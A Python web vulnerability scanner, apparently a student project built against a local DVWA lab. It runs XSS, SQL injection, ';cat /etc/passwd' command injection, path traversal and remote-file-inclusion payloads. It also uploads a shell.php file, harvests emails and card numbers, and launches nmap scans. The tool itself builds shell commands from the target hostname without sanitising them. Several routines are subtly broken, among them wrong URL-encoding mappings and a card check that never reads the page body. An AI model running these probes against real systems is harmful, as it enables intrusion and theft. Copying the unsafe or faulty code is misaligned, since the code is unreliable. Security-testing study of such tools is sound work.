#!/usr/bin/env python

import requests, re , urllib.parse 
import header
from bs4 import BeautifulSoup
import urllib3
import urllib
import sys
import emailprotectionslib.dmarc as dmarclib
from lxml import html
from IPy import IP
import subprocess
urllib3.disable_warnings()

class Scanner:
    def __init__(self,url):
        try:
            self.session = requests.Session()
            # self.session.get("http://127.0.0.1:80/dvwa/logout.php")
            r = self.session.get("http://127.0.0.1:80/dvwa/setup.php")
            his_clear={'create_db':'Create+/+Reset+Database'}
            token = re.search(r"user_token'\s*value='(.*?)'", r.text).group(1)
            his_clear['user_token'] = token
            self.session.post('http://127.0.0.1:80/dvwa/setup.php', data=his_clear)
            r = self.session.get("http://127.0.0.1:80/dvwa/login.php")
            payload = {'username': 'admin','password': 'password','Login': 'Login'}
            token = re.search(r"user_token'\s*value='(.*?)'", r.text).group(1)
            payload['user_token'] = token
            # print(token)
            self.session.post('http://127.0.0.1:80/dvwa/login.php', data=payload)
            print(self.session.cookies)
            # r = self.session.get('http://127.0.0.1/dvwa/index.php')
            # print(r.text)
            self.target_url = url
            self.target_links = []
            self.links_to_ignore = []
            self.file_n=str(url).split("/")[2]+"_repo.txt"
            # print(header.print_it())
            repo=open(self.file_n,"w")
            strng = header.print_it() + "\n"
            # strng += self.target_url+"\n"
            repo.write(strng)
            repo.close()
            print(strng)
        except:
            pass
         
# Crawler start
    def extract_links_from(self, url):
        response = self.session.get(url,verify=False) 
        # # print(self.session.cookies)
        # return re.findall('(?:href=")(.*?)"', str(response.content))            ##not with testphp
        webpage = html.fromstring(response.content)
        return webpage.xpath('//a/@href')

    def crawl(self, url=None):
        # try:
        if url == None:
            url=self.target_url
        href_links = self.extract_links_from(url)
        for link in href_links:
            try:
                if "logout" not in link:
                    link = urllib.parse.urljoin(url,link)

                if "#" in link:
                    link = link.split("#")[0]
                # if "=" in link:
                #     link = link[:link.index("=")+1]

                if self.target_url in link and link not in self.target_links:
                    self.target_links.append(link)
                    print(link)
                    repo=open(self.file_n,"a")
                    strng = link + "\n"
                    repo.write(strng)
                    repo.close()
                    self.crawl(link)
            
            except KeyboardInterrupt:
                break
            except:
                pass
            

# extracting forms and submitting 
    def extract_form(self,url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content,features="lxml")
        return parsed_html.findAll("form")              # form-container mei bhi hote h kuch as in internshala add those too

    def submit_form(self, form, value,url):
        action = form.get("action")             # where the wesbite is getting redirected  .get for attribute
        post_url = urllib.parse.urljoin(url,action)          # replacement for urlparse.urljoin
        method = form.get("method")             # what method is the form using
    
        input_lists = form.findAll("input")
        post_data = {}
        for input in input_lists:
            # print(input)
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            # print (input_name)
            if input_type == "text":
                input_value = value           # yeh input h, this will ne bruteforced with dictionary

            post_data[input_name] = input_value 
        if(method == "post"):
            return self.session.post(post_url, data=post_data)      # agr post method h to
        return self.session.get(post_url, params=post_data)     # for get methods

# Returns base website
    def root_website(self, url):
        new_url=urllib.parse.urljoin(url,"/")
        return new_url

# URL Encoding for reflected attacks
    def urlEncode(self,url):
        dict_url_enc = {" ": "%20", "!": "%21", "#": "%23", "$": "%24", "%": "%25", "&": "%26", "'": "%27", "(": "%28",
                ")": "%29", "*": "%30", "+": "%2B", ",": "%2C",
                "-": "%2D", ".": "%2E", "/": "%2F", "0": "%30", "1": "%31", "2": "%32", "3": "%33", "4": "%34",
                "5": "%35", "6": "%36", "7": "%37", "8": "%38",
                "9": "%39", ":": "%3A", ";": "%3B", "<": "%3C", "=": "%3D", ">": "%3E", "?": "%3F", "@": "%40",
                "A": "%41", "B": "%42", "C": "%43", "D": "%44",
                "E": "%45", "F": "%46", "G": "%47", "H": "%48", "I": "%49", "J": "%4A", "K": "%4B", "L": "%4C",
                "M": "%4D", "N": "%4E", "O": "%4F", "P": "%50",
                "Q": "%51", "R": "%52", "S": "%53", "T": "%54", "U": "%55", "V": "%56", "W": "%57", "X": "%58",
                "Y": "%59", "Z": "%5A", "[": "%5B", "]": "%5D",
                "^": "%5E", "_": "%5F", "`": "%60", "a": "%61", "b": "%62", "c": "%63", "d": "%64", "e": "%65",
                "f": "%66", "g": "%67", "h": "%68", "i": "%69",
                "j": "%6A", "k": "%6B", "l": "%6C", "m": "%6D", "n": "%6E", "o": "%6F", "p": "%70", "q": "%71",
                "r": "%72", "s": "%73", "t": "%74", "u": "%75",
                "v": "%76", "w": "%77", "y": "%78", "z": "%7A", "{": "%7B", "|": "%7C", "}": "%7D", "~": "%7E"}
        enc_pay = ""
        val = url.find("=")
        payload = url[val+1:]
        for i in payload:
            enc_pay += dict_url_enc[i]
        # print (" [!]Encoded Payload: ",enc_pay)
        url = url[:val+1] + enc_pay
        # print (" [!] Encoded URL: ", url )
        # strng=" [+]Encoded URL:"+enc_pay+"\n"
        # repo = open(self.file_n, "a")
        # repo.write(strng)
        # repo.close()
        return url

# Testing Misconfigured DNS Records
    def get_dmarc_record(self,domain):
        dmarc = dmarclib.DmarcRecord.from_domain(domain)
        # print(str(dmarc)," testing")
        if dmarc is not None and dmarc.record is not None:
            print(" [!] Found DMARC record:")
            print(" [!] "+str(dmarc.record))
            repo=open(self.file_n,"a")
            strng = " [!] Found DMARC record:\n"
            strng += str(dmarc.record)
            repo.write(strng)
            repo.close()
        return dmarc


    def get_dmarc_org_record(self,base_record):
        org_record = base_record.get_org_record()
        repo = open(self.file_n,"a")
        if org_record is not None:
            strng = " [!] Found DMARC Organizational record:\n"
            strng += " [!] "+str(org_record.record)+"\n"
            print(strng)
            repo.write(strng)
            repo.close()
        return org_record

    def check_dmarc_extras(self,dmarc_record):
        repo = open(self.file_n,"a")
        strng=""
        if dmarc_record.pct is not None and dmarc_record.pct != str(100):
                strng += "\t[***] DMARC pct is set to " + dmarc_record.pct + "% - might be possible\n"

        if dmarc_record.rua is not None:
            strng +=" [!] Aggregate reports will be sent: " + dmarc_record.rua + "\n"

        if dmarc_record.ruf is not None:
            strng += " [!] Forensics reports will be sent: " + dmarc_record.ruf+"\n"
        print(strng)
        repo.write(strng)
        repo.close()

    def check_dmarc_policy(self,dmarc_record):
        # print(str(dmarc_record)," qqqqqqqqqqqqqqqqqqq")
        strng=""
        repo = open(self.file_n,"a")
        policy_strength = False
        if dmarc_record.policy is not None:
            if dmarc_record.policy == "reject" or dmarc_record.policy == "quarantine":
                policy_strength = True
                strng +=" [!] DMARC policy set to " + dmarc_record.policy+"\n"
            else:
                strng += " [!] DMARC policy set to " + dmarc_record.policy +"\n"
        else:
            strng +=" [!] DMARC record has no Policy\n"
        print(strng)
        repo.write(strng)
        repo.close()
        return policy_strength

    def check_dmarc_org_policy(self,base_record):
        policy_strong = False
        repo = open(self.file_n,"a")
        strng =""
        org_record = base_record.get_org_record()
        if org_record is not None and org_record.record is not None:
            strng += " [!] Found organizational DMARC record:\n"
            strng += " [!] "+str(org_record.record) +"\n"

            if org_record.subdomain_policy is not None:
                if org_record.subdomain_policy == "none":
                    strng += " [!] Organizational subdomain policy set to "+org_record.subdomain_policy + "\n"
                elif org_record.subdomain_policy == "quarantine" or org_record.subdomain_policy == "reject":
                    strng += " [!] Organizational subdomain policy explicitly set to "+ org_record.subdomain_policy+"\n"
                    policy_strong = True
            else:
                strng += " [!] No explicit organizational subdomain policy. Defaulting to organizational policy\n"
                policy_strong = self.check_dmarc_policy(org_record)
        else:
            strng += " [!] No organizational DMARC record\n"
        print(strng)
        repo.write(strng)
        repo.close()    

    #     print("No organizational DMARC record")
        return policy_strong

    def is_dmarc_record_strong(self,domain):
        dmarc_record_strong = False

        dmarc = self.get_dmarc_record(domain)
        # print(dmarc)
        if dmarc is not None and dmarc.record is not None:
            dmarc_record_strong = self.check_dmarc_policy(dmarc)
            self.check_dmarc_extras(dmarc)
        elif dmarc.get_org_domain() is not None:
            # print("No DMARC record found. Looking for organizational record")
            dmarc_record_strong = self.check_dmarc_org_policy(dmarc)
        else:
            strng="\t[****] " + domain + " has no DMARC record!\n"
            repo = open(self.file_n,"a")
            print(strng)
            repo.write(strng)
            repo.close()
        # print(dmarc)
        return dmarc_record_strong
 
    def dmarccheck(self,domain):
        spoofable= False
        repo = open(self.file_n,"a")

        dmarc_record_strength = self.is_dmarc_record_strong(domain)
        if dmarc_record_strength is False:
            spoofable = True
        else:
            spoofable = False

        if spoofable:
            # print("\t[****]Spoofing possible for " + domain )
            repo=open(self.file_n,"a")
            strng = "\t[****] " + domain + " has no DMARC record!\n"
            strng += "\t[****] Spoofing possible for " + domain
            repo.write(strng)
            print(strng)
            repo.close()

# Xss in forms (Stored)
    def test_xss_in_forms(self,form,url):
        xss_test_scripts = ["\"><Script>alert(1)</Script>","</textarea><script>alert(1)</script>"]       #yaha loop aayega with payload list
        for xss_test_script in xss_test_scripts:
            response = self.submit_form(form,xss_test_script,url)
        # response = self.submit_form(form,xss_test_script,"http://localhost/mutillidae/index.php?page=dns-lookup.php")
        # print("\t\t\t\t\t\t\tABCDE")
            if xss_test_script in str(response.content):
            # print(response.content)
                return True
            return False

# Xss in url (reflected)
    def test_xss_in_link(self,url):
        xss_test_scripts = ["<Script>alert(1)</Script>","</textarea><script>alert(1)</script>"]
        for xss_test_script in xss_test_scripts:
            url = url.replace("=","="+xss_test_script)
            response = self.session.get(url)
            if xss_test_script in str(response.content):
                # print(response.content)
                return True 
            url = self.urlEncode(url)
            response = self.session.get(url)
            if xss_test_script in str(response.content):
                # print(response.content)
                return True 
            return False

# SQL Injection in URL
    def error_based_sqli_func(self,url):
        # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27' 
        # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
        
            
        val = url.find("=")
        payloads = ["3\'", "1\" or 1 = 1 --", "1\' or 1=1", "3'><", "1';#--"]
        checker = ["Syntax error" , "Unclosed mark" , "unterminated qoute" , "SQL Server" , "Microsoft Database" , "Fatal error" , "mysql_fetch_array()"," SQL syntax"]
        for payload in payloads:
            link = url[:val + 1] + payload
            repo=open(self.file_n,"a")
            response = self.session.get(link, verify=False)
            for check in checker:
                if check.lower() in str(response.content).lower():  
                    print ("\t[****]URL Vulnerable to SQL Injection: " + link)
                    strng = "\t[****]URL Vulnerable to SQL Injection: " + link+"\n"
                    repo.write(strng)
                    repo.close()
                    return
            link = url[:val + 1] + payload
            response = self.session.get(link, verify=False)
            for check in checker:
                if check.lower() in str(response.content).lower():  
                    print ("\t[****]URL Vulnerable to SQL Injection: " + link)
                    repo=open(self.file_n,"a")
                    strng = "\t[****]URL Vulnerable to SQL Injection: " + link+"\n"
                    repo.write(strng)
                    repo.close()
                    return
# SQL Injection in form

    def test_sql_in_forms(self,form,url):
        payloads = ["3'"]#, "1\" or 1 = 1 --", "1\' or 1=1", "3'><", "1';#--"]
        checker = ["Syntax error" , "Unclosed mark" , "unterminated qoute" , "SQL Server" , "Microsoft Database" , "Fatal error" , "mysql_fetch_array()"," SQL Syntax"]
        # checker = ["SQL syntax"]
        for payload in payloads:
            response = self.submit_form(form,payload,url)
            # print(response.content)
            for check in checker:
                # print(che
                if str(check).lower() in str(response.content).lower(): 
                    return True
        return False

# Public sensetive directory
    def sensetive_directory_disclosure(self, url,dir_file): 
        # url = self.root_website(url)
        # if "dvwa" in self.target_url
        if url[-1:] is not "/":
            url =url + "/"
        url = url+dir_file
        # print(url)
        response = self.session.get(url)
        if response.status_code == 200 :
            return True
        return False

# ClickJacking And Cross Frame Scripting
    def clickjacking(self,url):
        response = self.session.get(url)
        if str("X-Frame-Options").casefold() not in str(response.headers):
            return True
            # self.session.get()
        return False   

# Command Injection in URL
    def commandInjection(self,url):
        try:
            val = url.find("=")
            payload = url[:val + 1] + ";cat /etc/passwd"
            response = self.session.get(payload, verify=False)
            # if "root:x:" in response.content:
            # if "www-data" or "root:x:" in response.content:
            # print(response.content)

            strng = "\t[****]Command injection possible at URL " + url +" payload: ;cat /etc/passwd"+"\n"
            if "www-data" in str(response.content):
                print("\t[****]Command injection possible at URL ",url ," payload: ;cat /etc/passwd")
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                # print("Response: ", response.content)
                return
            url = self.urlEncode(payload) 
            response = self.session.get(payload, verify=False)
            if "www-data" in str(response.content):
                print(strng)
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                return           
                
        except:
            pass
        
# Command Injection in Form
    def test_command_inj_in_forms(self,form,url):
        payload = ";cat /etc/passwd"
        response = self.submit_form(form,payload,url)
        # print(response.content)
        if "www-data" in str(response.content):
                print("\t[***]Command injection possible with payload: ;cat /etc/passwd in link ",url ,"and form\n",form)
                repo=open(self.file_n,"a")
                strng = "\t[***]Command injection possible with payload: ;cat /etc/passwd in link "+url +"and form\n" + str(form)+"\n"
                repo.write(strng)
                repo.close()

# Directory Traversal Through URL
    def directory_traversal(self,url):
        try:
            val = url.find("=")
            payload = url[:val + 1] + "/../../../../../../etc/passwd"
            strng = "\t[****]Directory traversal possible, payload: \"../../../../../../etc/passwd\" at URL: "+url+"\n"
            response = self.session.get(payload, verify=False)
            if "www-data" in str(response.content):
                print("\t[****]Directory traversal possible, payload: \"../../../../../../etc/passwd\" at URL: ",url)
                # print("Response: ",response.content)
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                return            
            url = self.urlEncode(payload) 
            response = self.session.get(payload, verify=False)
            if "www-data" in str(response.content):
                print(strng)
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                return

        except:
            pass

# Local and Remote File Inclusion
    def file_inclusion(self,url):
        try:
            val = url.find("=")
            payload = url[:val + 1] + "/../../../../../../etc/passwd"
            response = self.session.get(payload, verify=False)
            strng = "\t[****]Local File include possible, payload: \"../../../../../../etc/passwd\" at URL: "+url + "\n"
            strng += "\t[****]Remote File include possible, payload: \"http://rfi.nessus.org/rfi.txt\" at URL: " + url+"\n"
            if "www-data" in str(response.content):
                print("\t[****]Local File include possible, payload: \"../../../../../../etc/passwd\" at URL: ",url)
                val = url.find("=")
                payload = url[:val + 1] + "http://rfi.nessus.org/rfi.txt"
                response = self.session.get(payload, verify=False)
                if "NessusCodeExecTest" in str(response.content):
                    print("\t[****]Remote File include possible, payload: \"http://rfi.nessus.org/rfi.txt\" at URL: ",url)
                    repo=open(self.file_n,"a")
                    repo.write(strng)
                    repo.close()
                # print("\t[****]File include possible, payload: \"../../../../../../etc/passwd\" at URL: ",url)
                # print("Response: ",response.content)
            url = self.urlEncode(payload) 
            response = self.session.get(payload, verify=False)
            if "www-data" in str(response.content):
                print(strng)
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                return
        except:
            pass

# URL Redirection  
    def url_redirection(self,url):
        try:
            val = url.find("=")
            payload = url[:val + 1] + "https://www.lipsum.com/"
            response = self.session.get(payload, verify=False)
            if "Neque porro quisquam est qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit..." in str(response.content):
                print("\t[****]URL Redirection Possible, payload: \"https://www.lipsum.com/\" at URL: ",url)
                    # print("Response: ",response.content)
                repo=open(self.file_n,"a")
                strng = "\t[****]URL Redirection Possible, payload: \"https://www.lipsum.com/\" at URL: "+url+"\n"
                repo.write(strng)
                repo.close()
                return
            url = self.urlEncode(payload) 
            response = self.session.get(payload, verify=False)
            if "Neque porro quisquam est qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit..." in str(response.content):
                print(strng)
                repo=open(self.file_n,"a")
                repo.write(strng)
                repo.close()
                return       
        except:
            pass

# Insecure File Upload
    def insecure_file_upload(self,url):
        try:
            response = self.session.get(url, verify=False)
            tree = html.fromstring(response.content)
            inputs = tree.xpath('//input[@name]')
            # print(inputs)
            if "upload".casefold() in str(inputs) and "file".casefold() in str(inputs) and "submit".casefold() in str(inputs):
                print(" [!]File Upload Function available")
                myFile = open("shell.php","rb")
                r = self.session.post(url,data={'MAX_FILE_SIZE':'100000','Upload':'Upload'},files={'uploaded':myFile})
                # print(r.content)
                if "not uploaded".casefold() not in str(r.content):
                    # print("\t[****] Insecure File Upload Found")
                    print("\t[****] Insecure File Upload Found at " + url +"\n")
                    repo = open(self.file_n, "a")
                    strng = " [!]File Upload Function available\n"
                    strng += "\t[****] Insecure File Upload Found at " + url +"\n"
                    repo.write(strng)
                    repo.close()
        except:
            pass

# Finding Email Addresses in Source Code
    def e_mail_disc(self,url):
        try: 
            payload = self.session.get(url, verify=False)
            # print(str(payload))
            response = re.findall(r'[\w.-]+@[\w.-]+\.\w+', str(payload.content))
            # print(str(payload.content))
            for i in response:
                print ("\t[****] E-mail address found: ", str(i))
                repo = open(self.file_n, "a")
                strng = ("\t[****] E-mail address found: "+str(i)+"\n")
                repo.write(strng)
                repo.close()
        except:
            pass

# Credit Card Disclosure in Source Code
    def credit_card_disc(self,url):
        payload = self.session.get(url, verify=False)
        start = str(payload).split()
        check_it = str("".join(start))
        AMEX = re.match(r"^3[47][0-9]{13}$", check_it)
        VISA = re.match(r"^4[0-9]{12}(?:[0-9]{3})?$", check_it)
        MASTERCARD = re.match(r"^5[1-5][0-9]{14}$", check_it)
        DISCOVER = re.match(r"^6(?:011|5[0-9]{2})[0-9]{12}$", check_it)
        try:
            if MASTERCARD.group():
                print (" [!] Website has a Master Card!")
                print (MASTERCARD.group())
                repo = open(self.file_n, "a")
                strng = (" [!] Website has a Master Card!\n")
                strng += MASTERCARD.group()+"\n"
                repo.write(strng)
                repo.close()
        except:
            pass

        try:
            if VISA.group():
                print (" [!] Website has a VISA card!")
                print (VISA.group())
                repo = open(self.file_n, "a")
                strng = (" [!] Website has a VISA card!\n")
                strng += VISA.group()+"\n"
                repo.write(strng)
                repo.close()
        except:
            pass

        try:
            if AMEX.group():
                print (" [!] Website has a AMEX card!")
                print (AMEX.group())
                repo = open(self.file_n, "a")
                strng = (" [!] Website has a AMEX card!\n")
                strng += AMEX.group()+"\n"
                repo.write(strng)
                repo.close()
        except:
            pass

        try:
            if DISCOVER.group():
                print (" [!] Website has a DISCOVER card!")
                print (DISCOVER.group())
                repo = open(self.file_n, "a")
                strng = " [!] Website has a DISCOVER card!\n"
                strng += DISCOVER.group()+"\n"
                repo.write(strng)
                repo.close()
        except:
            pass
        
# Host Header Injection
    def host_header_inj(self,url):
        header = {"Host":"www.bing.com"}
        response = self.session.get(url,headers=header)
        if response.status_code == 200 and "www.bing.com" in str(response.content):
            print("\t[****] Host Header Injection Found using Host as \"www.bing.com\" at " + url)
            repo = open(self.file_n, "a")
            strng = "\t[****] Host Header Injection Found using Host as \"www.bing.com\" at " + url +"\n"
            repo.write(strng)
            repo.close()

# Misconfigured CORS Vulnerability
    def mis_cors(self,url):
        try:    
            header = {"Origin":"https://www.bing.com"}
            response = self.session.get(url,headers=header)
            if str(response.headers['Acess-Control-Allow-Origin']) == 'https://www.bing.com' :
                print("\t[****]Misconfigured CORS found at URL" + url)
                repo = open(self.file_n, "a")
                strng = "\t[****]Misconfigured CORS found at URL" + url + "\n"
                repo.write(strng)
                repo.close()
        except:
            pass

# Check if Input is an IP v4 address   
    def check_if_ip(self,url):
        try:
            IP(url)
            return True
        except:
            return False

# Vulnerability Service Scan using Vulners Script 
    def vuln_service_scan(self,url):
        try:
            url = self.root_website(url)
            # print(url.index("/"))
            url = url[(url.index("//"))+2:len(url)-1]
            if ":" in url:
                url = url[:url.index(":")]
            # print(url)
            if not self.check_if_ip(url):
                output = subprocess.Popen("dig +short "+ url , shell=True, stdout=subprocess.PIPE).stdout.read()
                strn=str(output)
                ips= re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",strn)
                # print(ips)
            else:
                ips = []
                # print(url)
                ips.append(url)
            # ip = url
            for ip in ips:
                repo = open(self.file_n,"a")
                strng = "\n [!] Scanning Network Based Vulnerabilities in IP: "+ ip + "\n"
                print(strng)
                repo.write(strng)
                repo.close()
                output = str(subprocess.Popen("nmap -sV --script=vulners.nse -T4 " +ip+ " >> " + self.file_n ,shell=True,stdout=subprocess.PIPE).stdout.read())
                # print(output)
        except:
            pass
# Open Port Scan
    def open_port_scan(self,url):
        try:
            url = self.root_website(url)
            # print(url.index("/"))
            url = url[(url.index("//"))+2:len(url)-1]
            if ":" in url:
                url = url[:url.index(":")]
            # print(url)
            if not self.check_if_ip(url):
                # print (1)
                output = subprocess.Popen("dig +short "+ url , shell=True, stdout=subprocess.PIPE).stdout.read()
                strn=str(output)
                ips= re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",strn)
                # print(ips)
            else:
                ips = []
                # print(url)
                ips.append(url)
            # print(ips)
            for ip in ips:
                repo = open(self.file_n,"a")
                strng = "\n [!] Scanning For Open Ports in IP: "+ ip + "\n"
                print(strng)
                repo.write(strng)
                repo.close()
                output = subprocess.Popen("nmap -p- " +ip+ " >> " + self.file_n,shell=True,stdout=subprocess.PIPE).stdout.read()
                # print(str(output))
        except:
            pass

# Target Info    
    def print_target_info(self):
        strn = "--------------------------------------------------------- \n"
        strng = strn
        strng +="Target URL: "+ self.target_url + "\n"
        url = self.root_website(self.target_url)
        # print(url.index("/"))
        url = url[(url.index("//"))+2:len(url)-1]
        port = ""
        if ":" in url:
            port = url[url.index(":")+1:len(url)]
            url = url[:url.index(":")]
        # print(url)
        if not self.check_if_ip(url):
            # print (1)
            output = subprocess.Popen("dig +short "+ url , shell=True, stdout=subprocess.PIPE).stdout.read()
            strngs=str(output)
            ips= re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",strngs)
        else:
            ips = []
            # print(url)
            ips.append(url)
        ipS=""
        for ip in ips:
            ipS = ipS + ' ' + ip
        strng += "Target IP:"+ ipS + "\n"
        if port == "":
            x = self.target_url
            if x[:x.index("//")-1] == "http":
                port = "80"
            else:
                port ="443"
        strng += "Port: " + port+"\n"
        strng += strn
        repo = open(self.file_n,"a")
        repo.write(strng)
               
        print(strng)
        print("\n\nCrawler Starts")
        repo.write("\n\nCrawler Starts\n")
        repo.close()

# Scanner Starts
    def run_scanner(self):


###DMARC CHECK#############################################################################
        print("\n\n[+] Testing for Misconfiured DMARC:\n")
        repo=open(self.file_n,"a")
        strng = "\n\n[+] Testing for Misconfiured DMARC:"+"\n"
        repo.write(strng)
        repo.close()
        url = self.target_url
        # url=url[url.find"]
        self.dmarccheck(url)
        print("\n\n")        

###XSS CHECK###############################################################################
        print("\n\n[+] Testing Cross Site Scripting:\n")
        repo=open(self.file_n,"a")
        strng = "\n\n[+] Testing Cross Site Scripting:"+"\n"
        repo.write(strng)
        repo.close()        
        try:
            for link in self.target_links:
                forms = self.extract_form(link)
                for form in forms:
                    #testing forms
                    #print("Testing form in"+link)
                    #checking if request is get or post                 # post mei check karo jese in intern student_name and student_email
                    is_vulnerable_to_xss = self.test_xss_in_forms(form, link)
                    if is_vulnerable_to_xss:
                        print("\t[****] XSS discovered in " +link+ " in the form\n"+str(form)+"\n\n")
                        repo=open(self.file_n,"a")
                        strng = "\t[****] XSS discovered in " +link+ " in the form\n"+str(form)+"\n\n"
                        repo.write(strng)
                        repo.close()
            
                if "=" in link:
                        # print("Testing "+ link)
                        is_vulnerable_to_xss = self.test_xss_in_link(link)
                        if(is_vulnerable_to_xss):
                            print("\t[****] XSS discovered in " +link)
                            repo=open(self.file_n,"a")
                            strng = "\t[****] XSS discovered in " +link+"\n"
                            repo.write(strng)
                            repo.close() 
        except:
            pass

###SQL CHECK###############################################################################
        strng = "\n\n[+] Testing for SQL Injection:\n"
        strng += " [!] Covering MySQL, Oracle, MSQL, SSQL, MSACCESS & PostGreSQL Databases\n\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                if "=" in link and link[:link.index("=")+1] not in self.links_to_ignore:
                    self.error_based_sqli_func(link)
                forms = self.extract_form(link)
                for form in forms:
                    try:
                        is_vulnerable_to_sql = self.test_sql_in_forms(form, link)
                        if is_vulnerable_to_sql:
                            # strng = "\t[****] SQL Injection discovered in " +link+ " in the form\n"+str(form))+"\n\n"
                            repo=open(self.file_n,"a")
                            strng = "\t[****] SQL Injection discovered in " +link+ " in the form\n"+str(form)+"\n\n"
                            repo.write(strng)
                            repo.close() 
                            print(strng)
                    except:
                        pass
        except:
            pass                
                
        # self.error_based_sqli_func("http://testphp.vulnweb.com/artists.php?artist=1")
        # print("\n\n")

###SENSITIVE DIRECTORY CHECK###############################################################
        strng = "\n\n[+] Testing Sensitive Directory Disclosure"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        dirs = [".json",".htaccess","config.php","/config/config.php","composer.json"]           # yaha dictionary aayegi sensitive directories ki
        try:
            for dir_list in dirs:
                is_vulnerable_to_SDD = self.sensetive_directory_disclosure(self.target_url,dir_list)
                if (is_vulnerable_to_SDD):
                    print("\t[****] Public Sensitive Data Directory: "+dir_list)
                    repo=open(self.file_n,"a")
                    strng = "\t[****] Public Sensitive Data Directory: "+dir_list + "\n"
                    repo.write(strng)
                    repo.close()
        except:
            pass

###CLICKJACKING CHECK######################################################################
        strng = "\n\n[+] Testing Clickjacking" +"\n"
        print(strng)
        repo = open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                is_vulnerable_to_clickjacking = self.clickjacking(link)
                if(is_vulnerable_to_clickjacking):
                    print("\t[****] Clickjacking vulnerability in " + link)
                    print("\t[****] Cross Frame Scripting vulnerability in " + link)
                    repo=open(self.file_n,"a")
                    strng = "\t[****] Clickjacking vulnerability in " + link+"\n"
                    strng += "\t[****] Cross Frame Scripting vulnerability in " + link+"\n"
                    repo.write(strng)
                    repo.close()
        except:
            pass
        
###COMMAND INJECTION CHECK#################################################################
        strng = "\n\n[+] Testing for Command Injection:"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                forms = self.extract_form(link)
                for form in forms:
                    self.test_command_inj_in_forms(form, link)
                    
                if "=" in link:
                    self.commandInjection(link)
        except:
            pass
###FILE INCLUSION - LOCAL AND REMOTE#######################################################
        strng = "\n\n[+] Testing File Inclusion"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                if "=" in link:
                    self.file_inclusion(link)
        except:
            pass
###DIRECTORY TRAVERSAL CHECK###############################################################
        strng = "\n\n[+] Testing Directory Traversal"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                if "=" in link:
                    self.directory_traversal(link)
        except:
            pass

###URL REDIRECTION CHECK###################################################################
        strng = "\n\n[+] Testing Open URL Redirection"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                if "=" in link:
                    self.url_redirection(link)
        except:
            pass

###INSECURE FILE UPLOAD CHECK##############################################################
        strng = "\n\n[+] Testing Insecure File Upload"+"\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                # print(link)
                self.insecure_file_upload(link)
        except:
            pass

###HOST HEADER INJECTION CHECK#############################################################
        strng = "\n\n[+] Testing Host Header Injection\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        self.host_header_inj(self.target_url)

###MIS-CONFIGURED CORS CHECK###############################################################
        strng = "\n\n[+] Testing Misconfigured CORS\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                self.mis_cors(link)
        except:
            pass

###EMAIL ADDRESS DISCLOSURE CHECK##########################################################
        strng = "\n\n[+] Searching for Disclosed Email Addresses\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                self.e_mail_disc(link)
        except:
            pass
        # self.e_mail_disc(link)

###CREDIT/DEBIT CARD DISCLOSURE CHECK######################################################
        strng = "\n\n[+] Searching for Disclosed Credit/Debit Card Details\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        try:
            for link in self.target_links:
                self.credit_card_disc(link)
        except:
            pass
        
###OPEN PORT CHECK###########################################
        strng = "\n\n[+] Testing Open Ports on Web Server\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        self.open_port_scan(self.target_url)
       
###VULNERABLE SERVICES CHECK###########################################       
        strng = "\n\n[+] Testing Vulnerable Services on Website server\n"
        print(strng)
        repo=open(self.file_n,"a")
        repo.write(strng)
        repo.close()
        self.vuln_service_scan(self.target_url)

# scanner Ends

# Opening file
        try:
            subprocess.Popen(["leafpad",self.file_n])
        except:
            pass